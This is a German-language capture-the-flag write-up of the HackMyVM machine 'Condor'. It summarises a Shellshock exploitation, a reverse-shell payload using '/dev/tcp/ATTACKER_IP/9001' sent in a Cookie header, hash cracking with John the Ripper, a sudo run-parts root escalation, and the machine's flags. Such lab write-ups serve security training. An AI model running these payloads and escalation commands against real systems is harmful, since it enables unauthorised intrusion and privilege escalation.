# Condor - HackMyVM (Medium)

![Condor Icon](Condor.png)

## Übersicht

*   **VM:** Condor
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Condor)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 6. November 2021
*   **Original-Writeup:** https://alientec1908.github.io/Condor_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Die virtuelle Maschine "Condor" von HackMyVM (Schwierigkeitsgrad: Medium) wurde durch die Ausnutzung der Shellshock-Schwachstelle in einem CGI-Skript kompromittiert, was zu initialem Zugriff als Webserver-Benutzer führte. Durch das Auffinden einer benutzerdefinierten Passwortdatei im Home-Verzeichnis eines anderen Benutzers (`kevin`) konnten SHA512crypt-Hashes extrahiert werden. Einer dieser Hashes wurde mit John the Ripper geknackt und der zugehörige Benutzername (`paulo`) über Crackstation (MD5-Lookup) identifiziert. Die Privilegienerweiterung zu Root erfolgte durch die Ausnutzung einer unsicheren `sudo`-Regel, die es dem Benutzer `paulo` erlaubte, `run-parts` auf eine Weise auszuführen, die eine Root-Shell öffnete.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `nmap` (mit `http-shellshock` Skript)
*   `curl`
*   `feroxbuster`
*   `nc` (netcat)
*   `vi`
*   `john` (John the Ripper)
*   Crackstation (externe Webseite für MD5-Lookup)
*   Standard Linux-Befehle (`ls`, `cat`, `cd`, `cp`, `su`, `sudo`, `id`, `pwd`, `bash`)
*   `run-parts` (als Teil des Exploits)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Condor" gliederte sich in folgende Schritte:

1.  **Reconnaissance & Vulnerability Identification:**
    *   (Implizierter `arp-scan` zur IP-Findung: `192.168.2.128`, Hostname `condor.vm`).
    *   `nmap --script=http-shellshock` auf Port 80 identifizierte eine Shellshock-Anfälligkeit (CVE-2014-6271) im CGI-Skript `/cgi-bin/admin.cgi`.
    *   Die Anfälligkeit wurde mit `curl` und manipulierten `User-Agent`-Headern verifiziert (`echo "VULNERABLE..."`, `sleep 5`).
    *   `feroxbuster` fand ein weiteres CGI-Skript: `/cgi-bin/condor.sh`.

2.  **Initial Access (via Shellshock):**
    *   Die Shellshock-Schwachstelle wurde im Skript `/cgi-bin/condor.sh` ausgenutzt.
    *   Eine Reverse Shell wurde durch Injektion eines `/bin/bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1`-Payloads über den `Cookie`-Header mittels `curl` erlangt.
    *   Ein `nc`-Listener auf Port 9001 empfing die Shell (vermutlich als Webserver-Benutzer wie `apache` oder `www-data`).

3.  **Privilege Escalation (apache -> paulo):**
    *   In der erhaltenen Shell wurde das Home-Verzeichnis `/home/kevin` untersucht.
    *   Die Datei `/home/kevin/.i_did_it_again` wurde gefunden und enthielt eine Liste von Einträgen im Format `MD5-Hash:SHA512crypt-Hash`.
    *   Die SHA512crypt-Hashes wurden extrahiert und mit `john --wordlist=rockyou.txt` geknackt. Das Passwort `password123` wurde für den MD5-Hash `dd41cb18c930753cbecf993f828603dc` gefunden.
    *   Der MD5-Hash `dd41cb18c930753cbecf993f828603dc` wurde auf Crackstation als der Benutzername `paulo` identifiziert.
    *   Mit `su paulo` und dem Passwort `password123` wurde erfolgreich zum Benutzer `paulo` gewechselt.
    *   Die User-Flag wurde aus `/home/paulo/user.txt` gelesen.

4.  **Privilege Escalation (paulo -> root):**
    *   `sudo -l` für `paulo` zeigte: `(ALL) NOPASSWD: /usr/bin/run-parts --new-session --regex '^sh$' /bin`.
    *   Diese `sudo`-Regel wurde direkt ausgeführt: `sudo run-parts --new-session --regex '^sh$' /bin`.
    *   `run-parts` fand und führte `/bin/sh` (basierend auf der Regex `^sh$` im Verzeichnis `/bin`) als `root` aus, was zu einer Root-Shell führte.
    *   Die Root-Flag wurde aus `/root/root.txt` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Shellshock (CVE-2014-6271):** RCE-Schwachstelle in Bash, ausgenutzt über anfällige CGI-Skripte durch präparierte HTTP-Header (User-Agent, Cookie).
*   **Informationslecks:** Benutzerdefinierte Passwortdatei (`.i_did_it_again`) mit Passwort-Hashes im Home-Verzeichnis eines Benutzers.
*   **Passwort-Cracking:** Knacken von SHA512crypt-Hashes mit `john` und Zuordnung von MD5-Hashes zu Benutzernamen über Online-Dienste.
*   **Unsichere `sudo`-Konfiguration:** Erlaubte die Ausführung von `run-parts` mit Argumenten, die eine direkte Eskalation zu einer Root-Shell ermöglichten (GTFOBins-Technik).
*   **Laterale Bewegung:** Wechsel vom Webserver-Benutzer zum Benutzer `paulo` mittels geknackter Credentials.

## Flags

*   **User Flag (`/home/paulo/user.txt`):** `5870c58caa86a64fccc0d1b7b7717d39`
*   **Root Flag (`/root/root.txt`):** `fec28c2738220437750c2c9537c706f3`

## Tags

`HackMyVM`, `Condor`, `Medium`, `Shellshock`, `CGI`, `RCE`, `Password Cracking`, `JohnTheRipper`, `SHA512crypt`, `Sudo Privilege Escalation`, `run-parts`, `Linux`, `Web`
